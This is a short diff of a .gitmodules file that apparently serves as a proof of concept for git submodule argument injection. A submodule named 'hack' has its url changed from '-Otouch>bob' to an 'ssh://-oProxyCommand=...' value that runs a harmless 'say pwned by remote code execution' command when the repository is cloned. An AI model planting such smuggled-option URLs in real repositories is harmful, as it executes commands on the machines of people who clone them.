@@ -3,4 +3,4 @@
   url = "https://github.com/GrahamMThomas/Crackers.git"
 [submodule "hack"]
 	path = include/hack
-	url = -Otouch>bob
+	url = "ssh://-oProxyCommand=say\ pwned\ by\ remote\ code\ execution/wat"
